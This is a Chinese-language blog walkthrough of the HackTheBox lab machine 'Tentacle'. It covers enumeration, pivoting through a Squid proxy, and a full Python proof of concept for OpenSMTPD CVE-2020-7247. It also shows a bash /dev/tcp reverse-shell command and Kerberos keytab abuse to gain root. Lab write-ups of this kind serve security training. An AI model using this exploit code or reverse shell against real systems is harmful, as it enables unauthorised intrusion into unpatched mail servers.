---
layout:     post
title:      HackTheBox Tentacle
subtitle:   HackTheBox
date:       2021-06-10
author:     heria
header-img: img/post-bg-028.jpg
catalog: true
tags:
---



![image-20210608104457333](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608104457333.png)

## 信息收集

```
nmap -sS -sC -sV 10.10.10.224
```

![image-20210608104542330](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608104542330.png)

开放22,53,88,3128,9090端口

## 渗透

看下3128的http端口，发现是squid代理

（Squid是一个 Web 缓存代理，支持 HTTP, HTTPS, FTP, 以及更多。它通过缓存与重用经常请求的web页面，减少带宽使用同时提升了响应时间。Squid 具有可扩展的访问控制功能，同时可以使服务器加速）

![image-20210608105411839](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608105411839.png)

获取到一个用户名j.nakazawa@realcorp.htb和一个子域srv01.realcorp.htb (squid/4.11)

53端口是dns，从之前3128获得的域名可以尝试子域名枚举

```
dnsenum --threads 64 --dnsserver 10.10.10.224 -f /usr/share/amass/wordlists/subdomains-top1mil-110000.txt realcorp.htb
```

![image-20210608110428205](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608110428205.png)

```
ns.realcorp.htb.      259200   IN    A        10.197.243.77                                                   
proxy.realcorp.htb.   259200   IN    CNAME    ns.realcorp.htb.
ns.realcorp.htb.      259200   IN    A        10.197.243.77
wpad.realcorp.htb.    259200   IN    A        10.197.243.31
```

/etc/proxychains.conf中添加如下内容

```
http 10.10.10.224 3128 
http 127.0.0.1 3128 
http 10.197.243.77 3128
```

![image-20210608111508719](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608111508719.png)



之后proxychains nmap -sT -Pn -v 10.197.243.31  发现开放80端口

![image-20210608111920305](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608111920305.png)

在/etc/hosts中添加

```
10.197.243.31 wpad.realcorp.htb
```

之后通过代理尝试访问80端口，提示403

```
proxychains4 firefox wpad.realcorp.htb
```

![image-20210608131415306](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608131415306.png)



wpad是**Web Proxy Auto-Discovery Protocol**

WPAD 协议分析及内网渗透利用

```
https://xz.aliyun.com/t/1739#toc-9
```

可以直接查看wpad.dat文件

![image-20210608131544528](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608131544528.png)

查看内容

![image-20210608131808158](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608131808158.png)

发现新的网段10.241.251.0/24

使用proxychains和nmap对新网段进行扫描，发现存活主机10.241.251.113，并且该主机开放25端口，OpenSMTPD服务

![image-20210608132751454](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608132751454.png)

![image-20210608134143845](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608134143845.png)

相关漏洞

```
https://github.com/superzerosec/cve-2020-7247
```

poc代码:

getshell.py

```
import socket, time
import sys
if len(sys.argv) < 4:
    print("usage: script.py <host> <port> <command>")
    exit()
HOST = sys.argv[1]
PORT = int(sys.argv[2])
rev_shell_cmd = sys.argv[3]
payload = b"""\r\n

#0\r\n
#1\r\n
#2\r\n
#3\r\n
#4\r\n
#5\r\n
#6\r\n
#7\r\n
#8\r\n
#9\r\n
#a\r\n
#b\r\n 
#c\r\n
#d\r\n
""" + rev_shell_cmd.encode() + b"""
.
"""
for res in socket.getaddrinfo(HOST, PORT, socket.AF_UNSPEC, socket.SOCK_STREAM):
    af, socktype, proto, canonname, sa = res
    try:
        s = socket.socket(af, socktype, proto)
    except OSError as msg:
        s = None
        continue
    try:
        s.connect(sa)
    except OSError as msg:
        s.close()
        s = None
        continue
    break
if s is None:
    print('could not open socket')
    sys.exit(1)
with s:
    data = s.recv(1024)
    print('Received', repr(data))
    time.sleep(1)
    print('SENDING HELO')
    s.send(b"helo test.com\r\n")
    data = s.recv(1024)
    print('RECIEVED', repr(data))
    s.send(b"MAIL FROM:<;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;>\r\n")
    time.sleep(1)
    data = s.recv(1024)
    print('RECIEVED', repr(data))
    s.send(b"RCPT TO:<j.nakazawa@realcorp.htb>\r\n")
    data = s.recv(1024)
    print('RECIEVED', repr(data))
    s.send(b"DATA\r\n")
    data = s.recv(1024)
    print('RECIEVED', repr(data))
    s.send(payload)
    data = s.recv(1024)
    print('RECIEVED', repr(data))
    s.send(b"QUIT\r\n")
    data = s.recv(1024)
    print('RECIEVED', repr(data))
print("Exploited Check you netcat :D")
s.close()
```

之后kali开启监听，另一个终端中执行

```
proxychains4 python3 getshell.py 10.241.251.113 25 'bash -c "exec bash -i &> /dev/tcp/10.10.14.3/8888 0>&1"'
```

![image-20210608140043698](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608140043698.png)

收到反弹shell

smtp的root

![image-20210608140304912](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608140304912.png)

之后在/home/j.nakazawa下找到.msmtprc文件，里面有账密

![image-20210608140732445](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608140732445.png)

账密j.nakazawa    sJB}RM>6Z~64_但是没法直接ssh,需要使用 kerbos 生成票证并使用该票证以用户身份登录

```
apt-get install krb5-user
```



更改/etc/hosts

![image-20210608141604262](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608141604262.png)

修改/etc/krb5.conf

![image-20210608141927462](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608141927462.png)

修改之后保存继续执行

```
kinit j.nakazawa  
输入密码
klist 
ssh j.nakazawa@10.10.10.224
```

![image-20210608142224613](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608142224613.png)

找到user.txt，拿到第一个flag

![image-20210608142404292](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608142404292.png)

在crontab计划任务中发现执行log_backup.sh脚本，查看具体内容

![image-20210608142547366](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608142547366.png)

可以看到是定是从squid目录复制文件到admin目录，那么如果我们可以考虑写入认证文件到squid，使其复制到admin，从而使得我们可以用之前生成的ticket以admin用户身份登录

![image-20210608143121893](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608143121893.png)

之后尝试ssh直接链接，多尝试几次，由于需要时间执行计划任务，可能不一定会立刻生效

![image-20210608143445937](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608143445937.png)

当前admin用户，klist发现有很多ticket

> Keytab是一个文件，其中包含Kerberos主体和加密密钥对（从Kerberos密码派生）。**您可以使用keytab文件使用Kerberos对各种远程系统进行身份验证，而无需输入密码**

![image-20210608143811760](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608143811760.png)

所以我们可以利用kadmin去创建一个root ticket

```
kadmin -k -t /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
add_principal root@REALCORP.HTB
之后输入密码
确认密码
exit
```

![image-20210608144222023](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608144222023.png)

使用ksu 切到root,获得第二个flag

```
ksu root 
输入密码
```

![image-20210608144738334](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608144738334.png)